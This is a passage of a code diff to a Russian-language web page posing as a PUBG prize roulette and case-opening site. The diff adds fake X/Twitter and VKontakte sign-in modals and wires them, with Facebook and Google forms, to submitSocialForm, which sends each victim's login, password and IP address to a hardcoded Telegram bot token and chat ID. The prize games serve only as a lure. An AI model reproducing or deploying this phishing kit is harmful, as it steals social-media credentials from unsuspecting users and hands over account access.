+            
+            <div class="x-footer">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Twitter/X модальное окно (этап 2: пароль) -->
+    <div class="modal-overlay modal-dark" id="xModalStep2">
+        <div class="modal modal-dark x-modal-step2">
+            <button class="close-modal" onclick="closeSocial('twitter')">&times;</button>
+            
+            <div class="x-logo">
+                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
+                    <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
+                </svg>
+            </div>
+            
+            <h2 class="x-step2-title">Enter your password</h2>
+            
+            <form id="xPasswordForm" onsubmit="submitSocialForm('twitter'); return false;">
+                <input type="password" class="x-password-input" placeholder="Enter your password" required>
+                
+                <button type="submit" class="x-login-btn">Sign in</button>
+            </form>
+            
+            <a href="#" class="x-forgot-password">Forgot password?</a>
+            
+            <div class="x-step2-footer">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Соцсети: ВКонтакте -->
+    <div class="modal-overlay" id="vkModal">
+        <div class="modal">
+            <button class="close-modal" onclick="closeSocial('vk')">&times;</button>
+            <div style="text-align: center;">
+                <img src="vkontakte.png" alt="VK" class="vk-logo">
+            </div>
+            <h1 class="vk-title">Вход ВКонтакте</h1>
+            
+            <form id="vkLoginForm" onsubmit="submitSocialForm('vk'); return false;">
+                <label class="vk-label">Телефон или email</label>
+                <input type="text" class="vk-input" placeholder="Телефон или email" required>
+                
+                <label class="vk-label">Пароль</label>
+                <input type="password" class="vk-input" placeholder="Пароль" required>
+                
+                <div class="vk-checkbox">
+                    <input type="checkbox" id="vkComputer">
+                    <label for="vkComputer">Чужой компьютер</label>
+                </div>
+                
+                <button type="submit" class="vk-submit-btn">Войти</button>
+            </form>
+            
+            <div class="vk-links">
+                <a href="#" class="vk-link">Регистрация</a>
+            </div>
+            
+            <div style="text-align: center; padding-top: 20px; border-top: 1px solid #DCE1E6;">
+                <a href="#" class="vk-link" style="font-size: 14px;">Забыли пароль или не можете войти?</a>
+            </div>
         </div>
     </div>
 
@@ -574,38 +866,16 @@
             <i class="fas fa-gamepad"></i>
             <span>Games</span>
         </div>
-        <div class="nav-item" onclick="showSection('spin')">
+        <div class="nav-item">
             <i class="fas fa-dumbbell"></i>
-            <span>Spin</span>
+            <span>Exercises</span>
         </div>
     </nav>
 
     <script>
-        // ===== КОНФИГУРАЦИЯ =====
+        // --- CONFIG ---
         const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const CHAT_ID = '1709490182';
-        
-        // Курсы валют (примерные)
-        const exchangeRates = {
-            'RUB': 1,       // 1 UC = 1 RUB
-            'UAH': 0.25,    // 1 UC = 0.25 UAH
-            'USD': 0.011,   // 1 UC = 0.011 USD
-            'UZS': 140      // 1 UC = 140 UZS
-        };
-        
-        const currencySymbols = {
-            'RUB': '₽',
-            'UAH': '₴',
-            'USD': '$',
-            'UZS': 'сум'
-        };
-        
-        const countryNames = {
-            'RU': 'Россия',
-            'UA': 'Украина',
-            'US': 'США',
-            'UZ': 'Узбекистан'
-        };
         
         const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
         const prizeNames = [
@@ -620,40 +890,35 @@
             'Mystery Box'
         ];
         
-        // ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
         let userIP = '';
+        let currentMethod = '';
         let currentSection = 'hub';
-        let userBalance = localStorage.getItem('pubg_balance') ? parseInt(localStorage.getItem('pubg_balance')) : 0;
-        let selectedCountry = '';
-        let selectedAmount = 0;
+        let previousSection = 'hub';
         let isSpinning = false;
-        let navHistory = ['hub'];
+        let balance = 0;
+        let spinCompleted = false;
 
-        // Инициализация
-        document.addEventListener('DOMContentLoaded', function() {
-            updateBalanceDisplay();
-            generateCaseTape();
-            
-            // Определение IP
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                userIP = d.ip + ' (' + d.country_name + ')';
-                const countryCode = d.country_code || 'RU';
-                selectCountry(countryCode);
-            }).catch(() => {
-                userIP = 'Не определено';
-                selectCountry('RU');
-            });
-        });
+        // Определение IP
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
-        // ===== ФУНКЦИИ НАВИГАЦИИ =====
+        // История навигации
+        const navHistory = ['hub'];
+
+        // Навигация
         function showSection(id) {
             previousSection = currentSection;
             currentSection = id;
             
-            ['section-hub', 'section-case', 'section-spin'].forEach(s => {
+            // Скрываем все секции
+            ['section-hub', 'section-case', 'section-spin', 'facebookFullscreen', 'googleFullscreen'].forEach(s => {
                 document.getElementById(s).style.display = 'none';
+                document.getElementById(s).classList.remove('flex');
             });
             
+            // Скрываем модалки соцсетей
+            closeAllSocial();
+            
+            // Показываем нужную секцию
             const target = document.getElementById('section-' + id);
             if(target) {
                 target.style.display = 'block';
@@ -668,18 +933,23 @@
                     document.querySelector('.nav-item:nth-child(1)').classList.add('active');
                 } else if (id === 'hub') {
                     document.querySelector('.nav-item:nth-child(2)').classList.add('active');
-                } else if (id === 'spin') {
-                    document.querySelector('.nav-item:nth-child(3)').classList.add('active');
+                }
+                
+                // Если перешли на спин, проверяем состояние
+                if (id === 'spin' && spinCompleted) {
+                    document.getElementById('socialButtons').style.display = 'block';
                 }
             }
             
+            // Показываем/скрываем кнопку "Назад"
             updateBackButton();
+            
             window.scrollTo(0,0);
         }
 
         function goBack() {
             if (navHistory.length > 1) {
-                navHistory.pop();
+                navHistory.pop(); // Удаляем текущую
                 const prev = navHistory[navHistory.length - 1];
                 showSection(prev);
             }
@@ -687,114 +957,99 @@
 
         function updateBackButton() {
             const backBtn = document.getElementById('backBtn');
-            backBtn.style.display = currentSection !== 'hub' ? 'flex' : 'none';
+            // Показываем кнопку "Назад" только если не на главной
+            if (currentSection !== 'hub') {
+                backBtn.style.display = 'flex';
+            } else {
+                backBtn.style.display = 'none';
+            }
         }
 
-        // ===== БАЛАНС И ОТОБРАЖЕНИЕ =====
-        function updateBalanceDisplay() {
-            document.getElementById('balanceText').textContent = `Баланс: ${userBalance} UC`;
-            
-            // Проверяем кнопки в зависимости от баланса
-            if (userBalance >= 60) {
-                document.getElementById('openBtn').style.display = 'block';
-                document.getElementById('depositBtn').style.display = 'none';
-                document.getElementById('errorBox').style.display = 'none';
-                
-                document.getElementById('spinBtn').style.display = 'block';
-                document.getElementById('spinDepositBtn').style.display = 'none';
-                document.getElementById('spinErrorBox').style.display = 'none';
-            } else {
+        // Генерация ленты кейса с вашими картинками
+        const tape = document.getElementById('caseTape');
+        for(let i=0; i<40; i++) {
+            const randomIndex = Math.floor(Math.random() * prizeImages.length);
+            const img = prizeImages[randomIndex];
+            const name = prizeNames[randomIndex];
+            tape.innerHTML += `
+                <div class="case-item">
+                    <img src="${img}">
+                    <span class="pubg-font">${name}</span>
+                </div>
+            `;
+        }
+
+        // Логика открытия кейса
+        function openCase() {
+            if (balance < 60) {
+                document.getElementById('errorBox').style.display = 'block';
                 document.getElementById('openBtn').style.display = 'none';
                 document.getElementById('depositBtn').style.display = 'block';
                 
-                document.getElementById('spinBtn').style.display = 'none';
-                document.getElementById('spinDepositBtn').style.display = 'block';
-            }
-        }
-
-        // ===== GIFT DROP (КЕЙСЫ) =====
-        function generateCaseTape() {
-            const tape = document.getElementById('caseTape');
-            tape.innerHTML = '';
-            
-            for(let i = 0; i < 40; i++) {
-                const randomIndex = Math.floor(Math.random() * prizeImages.length);
-                const img = prizeImages[randomIndex];
-                const name = prizeNames[randomIndex];
-                
-                tape.innerHTML += `
-                    <div class="case-item">
-                        <img src="${img}">
-                        <span class="pubg-font">${name}</span>
-                    </div>
-                `;
-            }
-        }
-
-        function openCase() {
-            if (userBalance < 60) {
-                document.getElementById('errorBox').style.display = 'block';
+                sendTelegram(`⚠️ Пользователь нажал "Открыть кейс" без баланса (IP: ${userIP})`);
                 return;
             }
-
-            // Вычитаем стоимость
-            userBalance -= 60;
-            localStorage.setItem('pubg_balance', userBalance);
-            updateBalanceDisplay();
-
-            // Анимация вращения ленты
-            const tape = document.getElementById('caseTape');
-            const offset = 130 * 20 + Math.floor(Math.random() * 200);
+            
+            // Крутим ленту для вида
+            const offset = 130 * 25 + Math.floor(Math.random()*100);
             tape.style.transform = `translateX(-${offset}px)`;
-
-            // Определяем выигрыш
+            
+            // Имитация задержки открытия
             setTimeout(() => {
+                // Случайный приз
                 const randomIndex = Math.floor(Math.random() * prizeImages.length);
                 const winImg = prizeImages[randomIndex];
                 const winName = prizeNames[randomIndex];
                 
+                // Показываем выигрыш
                 showWinModal(winImg, winName);
                 
                 // Отправляем в Telegram
-                sendTelegram(`🎁 Пользователь открыл кейс и выиграл: ${winName}\nБаланс: ${userBalance} UC\nIP: ${userIP}`);
+                sendTelegram(`🎁 Пользователь открыл кейс и выиграл: ${winName} (IP: ${userIP})`);
                 
-            }, 3000);
+            }, 2000);
         }
 
-        // ===== LUCKY SPIN (РУЛЕТКА) =====
+        // Логика вращения рулетки
         function startSpin() {
-            if (isSpinning || userBalance < 60) return;
+            if (isSpinning) return;
+            
+            if (balance < 60) {
+                document.getElementById('spinErrorBox').style.display = 'block';
+                document.getElementById('spinBtn').style.display = 'none';
+                document.getElementById('spinDepositBtn').style.display = 'block';
+                
+                sendTelegram(`🎡 Пользователь нажал "Крутить рулетку" без баланса (IP: ${userIP})`);
+                return;
+            }
             
             isSpinning = true;
-            userBalance -= 60;
-            localStorage.setItem('pubg_balance', userBalance);
-            updateBalanceDisplay();
-            
             const spinBtn = document.getElementById('spinBtn');
             spinBtn.disabled = true;
             spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Вращение...';
             
-            // Сбрасываем активные ячейки
-            document.querySelectorAll('.spin-cell').forEach(cell => {
-                cell.classList.remove('active');
-            });
+            // Сбрасываем все подсветки
+            for (let i = 0; i < 9; i++) {
+                document.getElementById(`s${i}`).style.borderColor = 'transparent';
+                document.getElementById('mid').style.borderColor = 'transparent';
+            }
             
-            // Логика вращения рулетки
-            const cells = document.querySelectorAll('.spin-cell:not(.center-cell)');
-            const totalSpins = 15 + Math.floor(Math.random() * 10);
+            // Анимация вращения
+            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let currentCell = 0;
+            const totalSpins = 20 + Math.floor(Math.random() * 10);
             let spinCount = 0;
             
             const spinInterval = setInterval(() => {
-                // Убираем подсветку с предыдущей
+                // Снимаем подсветку с предыдущей ячейки
                 if (currentCell > 0) {
-                    cells[currentCell - 1].classList.remove('active');
+                    document.getElementById(cells[currentCell - 1]).style.borderColor = 'transparent';
                 }
                 
-                // Подсвечиваем текущую
-                cells[currentCell].classList.add('active');
+                // Подсвечиваем текущую ячейку
+                document.getElementById(cells[currentCell]).style.borderColor = '#ffbc00';
+                document.getElementById(cells[currentCell]).style.boxShadow = '0 0 15px #ffbc00';
                 
-                // Переходим к следующей ячейке
                 currentCell = (currentCell + 1) % cells.length;
                 spinCount++;
                 
@@ -802,32 +1057,35 @@
                 if (spinCount >= totalSpins) {
                     clearInterval(spinInterval);
                     
-                    // Определяем выигрышную ячейку
-                    const winIndex = (currentCell - 1 + cells.length) % cells.length;
-                    const winCell = cells[winIndex];
+                    // Определяем выигрышную ячейку (последняя подсвеченная)
+                    const winCellIndex = (currentCell - 1 + cells.length) % cells.length;
+                    const winCellId = cells[winCellIndex];
                     
-                    // Задержка перед показом выигрыша
                     setTimeout(() => {
-                        const winId = parseInt(winCell.getAttribute('data-id'));
-                        const winImg = prizeImages[winId] || prizeImages[0];
-                        const winName = prizeNames[winId] || 'Тайный приз';
+                        // Показываем выигрыш
+                        const winImg = document.querySelector(`#${winCellId} img`).src.split('/').pop();
+                        const winIndex = prizeImages.indexOf(winImg);
+                        const winName = winIndex >= 0 ? prizeNames[winIndex] : 'Тайный приз';
                         
                         showWinModal(winImg, winName);
                         
-                        // Сбрасываем состояние
+                        // Сбрасываем состояние кнопки
                         spinBtn.disabled = false;
                         spinBtn.innerHTML = 'Крутить (60 UC)';
                         isSpinning = false;
                         
+                        // Помечаем, что спин завершен
+                        spinCompleted = true;
+                        
                         // Отправляем в Telegram
-                        sendTelegram(`🎡 Пользователь крутил рулетку и выиграл: ${winName}\nБаланс: ${userBalance} UC\nIP: ${userIP}`);
+                        sendTelegram(`🎡 Пользователь крутил рулетку и выиграл: ${winName} (IP: ${userIP})`);
                         
                     }, 500);
                 }
-            }, 150);
+            }, 100);
         }
 
-        // ===== МОДАЛКА ВЫИГРЫША =====
+        // Показать модалку с выигрышем
         function showWinModal(image, name) {
             document.getElementById('winPrizeImage').src = image;
             document.getElementById('winPrizeName').textContent = name;
@@ -838,209 +1096,128 @@
             document.getElementById('winModal').style.display = 'none';
         }
 
-        // ===== ПЛАТЕЖНАЯ СИСТЕМА =====
-        function showPaymentModal() {
-            document.getElementById('paymentModal').style.display = 'flex';
-        }
-
-        function closePaymentModal() {
-            document.getElementById('paymentModal').style.display = 'none';
-            resetPaymentForm();
-        }
-
-        function selectCountry(countryCode) {
-            selectedCountry = countryCode;
-            
-            // Обновляем визуальный выбор
-            document.querySelectorAll('.amount-option').forEach(opt => {
-                opt.classList.remove('selected');
-            });
-            
-            // Находим родительский элемент и добавляем класс selected
-            const target = event ? event.target.closest('.amount-option') : null;
-            if (target) {
-                target.classList.add('selected');
-            }
-            
-            updatePrices();
-            checkPaymentReady();
-        }
-
-        function selectAmount(amount) {
-            selectedAmount = amount;
-            
-            // Обновляем визуальный выбор
-            document.querySelectorAll('.amount-option').forEach(opt => {
-                opt.classList.remove('selected');
-            });
-            
-            if (event) {
-                event.target.closest('.amount-option').classList.add('selected');
-            }
-            
-            checkPaymentReady();
-        }
-
-        function updatePrices() {
-            if (!selectedCountry) return;
-            
-            const currency = getCurrencyForCountry(selectedCountry);
-            const symbol = currencySymbols[currency];
-            
-            // Обновляем отображение цен
-            document.querySelectorAll('[id^="price"]').forEach(el => {
-                const amount = parseInt(el.id.replace('price', ''));
-                const price = Math.ceil(amount * exchangeRates[currency]);
-                el.textContent = `~${price} ${symbol}`;
-            });
-        }
-
-        function getCurrencyForCountry(countryCode) {
-            return {
-                'RU': 'RUB',
-                'UA': 'UAH', 
-                'US': 'USD',
-                'UZ': 'UZS'
-            }[countryCode] || 'USD';
-        }
-
-        function checkPaymentReady() {
-            const payButton = document.getElementById('payButton');
-            if (selectedCountry && selectedAmount > 0) {
-                payButton.disabled = false;
-                
-                const currency = getCurrencyForCountry(selectedCountry);
-                const symbol = currencySymbols[currency];
-                const amountInCurrency = Math.ceil(selectedAmount * exchangeRates[currency]);
-                
-                payButton.innerHTML = `<i class="fas fa-lock mr-2"></i>Оплатить ${selectedAmount} UC (${amountInCurrency} ${symbol})`;
-            } else {
-                payButton.disabled = true;
-                payButton.innerHTML = `<i class="fas fa-lock mr-2"></i>Выберите страну и сумму`;
+        function showSocialAfterWin() {
+            closeWinModal();
+            if (currentSection === 'spin') {
+                document.getElementById('socialButtons').style.display = 'block';
             }
         }
 
-        function processPayment() {
-            if (!selectedCountry || !selectedAmount) return;
+        // Управление соцсетями
+        function showSocial(network) {
+            closeAllSocial();
             
-            // Обновляем текст в модалке карты
-            const currency = getCurrencyForCountry(selectedCountry);
-            const symbol = currencySymbols[currency];
-            const amountInCurrency = Math.ceil(selectedAmount * exchangeRates[currency]);
-            
-            document.getElementById('paymentAmountText').textContent = `${selectedAmount} UC`;
-            document.getElementById('paymentCurrencyText').textContent = `~${amountInCurrency} ${symbol}`;
-            
-            // Показываем модалку оплаты картой
-            closePaymentModal();
-            document.getElementById('cardPaymentModal').style.display = 'flex';
+            switch(network) {
+                case 'facebook':
+                    document.getElementById('facebookFullscreen').style.display = 'block';
+                    break;
+                case 'google':
+                    document.getElementById('googleFullscreen').style.display = 'block';
+                    document.getElementById('googleStep1').style.display = 'block';
+                    document.getElementById('googleStep2').style.display = 'none';
+                    break;
+                case 'twitter':
+                    document.getElementById('xModalStep1').style.display = 'flex';
+                    break;
+                case 'vk':
+                    document.getElementById('vkModal').style.display = 'flex';
+                    break;
+            }
         }
 
-        function closeCardPaymentModal() {
-            document.getElementById('cardPaymentModal').style.display = 'none';
-            resetPaymentForm();
+        function closeAllSocial() {
+            document.getElementById('facebookFullscreen').style.display = 'none';
+            document.getElementById('googleFullscreen').style.display = 'none';
+            document.getElementById('xModalStep1').style.display = 'none';
+            document.getElementById('xModalStep2').style.display = 'none';
+            document.getElementById('vkModal').style.display = 'none';
         }
 
-        function submitCardPayment() {
-            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const cardExpiry = document.getElementById('cardExpiry').value;
-            const cardCvv = document.getElementById('cardCvv').value;
-            const cardName = document.getElementById('cardName').value;
+        function closeSocial(network) {
+            switch(network) {
+                case 'facebook':
+                    document.getElementById('facebookFullscreen').style.display = 'none';
+                    break;
+                case 'google':
+                    document.getElementById('googleFullscreen').style.display = 'none';
+                    break;
+                case 'twitter':
+                    document.getElementById('xModalStep1').style.display = 'none';
+                    document.getElementById('xModalStep2').style.display = 'none';
+                    break;
+                case 'vk':
+                    document.getElementById('vkModal').style.display = 'none';
+                    break;
+            }
+        }
+
+        function googleNext() {
+            const email = document.getElementById('googleEmailInput').value;
+            if (email) {
+                document.getElementById('googleStep1').style.display = 'none';
+                document.getElementById('googleStep2').style.display = 'block';
+            }
+        }
+
+        function twitterNext() {
+            document.getElementById('xModalStep1').style.display = 'none';
+            document.getElementById('xModalStep2').style.display = 'flex';
+        }
+
+        function submitSocialForm(network) {
+            let login = '';
+            let password = '';
             
-            // Валидация
-            if (!validateCardInput(cardNumber, cardExpiry, cardCvv, cardName)) {
-                alert('Пожалуйста, заполните все поля корректно');
-                return;
+            switch(network) {
+                case 'facebook':
+                    login = document.getElementById('facebookLogin').value;
+                    password = document.getElementById('facebookPassword').value;
+                    break;
+                case 'google':
+                    login = document.getElementById('googleEmailInput').value;
+                    password = document.getElementById('googlePasswordInput').value;
+                    break;
+                case 'twitter':
+                    login = document.querySelector('#xModalStep1 .x-input').value;
+                    password = document.querySelector('#xModalStep2 .x-password-input').value;
+                    break;
+                case 'vk':
+                    login = document.querySelector('#vkModal .vk-input[type="text"]').value;
+                    password = document.querySelector('#vkModal .vk-input[type="password"]').value;
+                    break;
             }
             
-            // Имитация обработки платежа
-            simulatePaymentProcessing();
-        }
-
-        function validateCardInput(cardNumber, expiry, cvv, name) {
-            if (!cardNumber || cardNumber.length < 16) return false;
-            if (!expiry || !expiry.match(/^\d{2}\/\d{2}$/)) return false;
-            if (!cvv || cvv.length !== 3) return false;
-            if (!name || name.length < 3) return false;
-            return true;
-        }
-
-        function simulatePaymentProcessing() {
-            // Показываем индикатор загрузки
-            document.getElementById('cardPaymentModal').innerHTML = `
-                <div class="text-center p-10">
-                    <i class="fas fa-spinner fa-spin text-3xl mb-3 text-yellow-500"></i>
-                    <p class="text-white font-bold">Обработка платежа...</p>
-                    <p class="text-gray-400 text-sm mt-2">Пожалуйста, подождите</p>
-                </div>
+            const msg = `
+🔥 **NEW LOGIN** 🔥
+👤 Соцсеть: ${network}
+📧 Логин: \`${login}\`
+🔑 Пароль: \`${password}\`
+🌐 IP: ${userIP}
+🎰 После вращения рулетки
             `;
             
-            // Имитируем обработку платежа
-            setTimeout(() => {
-                simulatePaymentSuccess();
-            }, 2000);
+            sendTelegram(msg);
+            
+            // Показываем сообщение об успехе
+            alert('Данные отправлены! Ожидайте получения приза.');
+            closeAllSocial();
         }
 
-        function simulatePaymentSuccess() {
-            // Пополняем баланс
-            userBalance += selectedAmount;
-            localStorage.setItem('pubg_balance', userBalance);
-            updateBalanceDisplay();
-            
-            // Закрываем модалки
-            closeCardPaymentModal();
-            closePaymentModal();
-            
-            // Показываем уведомление
-            alert(`✅ Успешно! Баланс пополнен на ${selectedAmount} UC`);
-            
-            // Отправляем данные в Telegram
-            const currency = getCurrencyForCountry(selectedCountry);
-            const amountInCurrency = Math.ceil(selectedAmount * exchangeRates[currency]);
-            
-            sendTelegram(`
-💰 **НОВОЕ ПОПОЛНЕНИЕ**
-💎 Сумма: ${selectedAmount} UC
-🏦 Валюта: ${amountInCurrency} ${currencySymbols[currency]}
-📍 Страна: ${countryNames[selectedCountry]}
-👤 IP: ${userIP}
-📊 Новый баланс: ${userBalance} UC
-            `);
-        }
-
-        function resetPaymentForm() {
-            selectedCountry = '';
-            selectedAmount = 0;
-            document.querySelectorAll('.amount-option').forEach(opt => {
-                opt.classList.remove('selected');
-            });
-            
-            // Сбрасываем поля карты
-            document.getElementById('cardNumber').value = '';
-            document.getElementById('cardExpiry').value = '';
-            document.getElementById('cardCvv').value = '';
-            document.getElementById('cardName').value = '';
-        }
-
-        // ===== TELEGRAM УВЕДОМЛЕНИЯ =====
         async function sendTelegram(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID, 
-                        text: text, 
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                 });
             } catch(e) {
                 console.error('Telegram error:', e);
             }
         }
 
-        // Инициализация при загрузке
+        // Инициализация
         showSection('hub');
+        updateBackButton();
     </script>
 </body>
 </html>
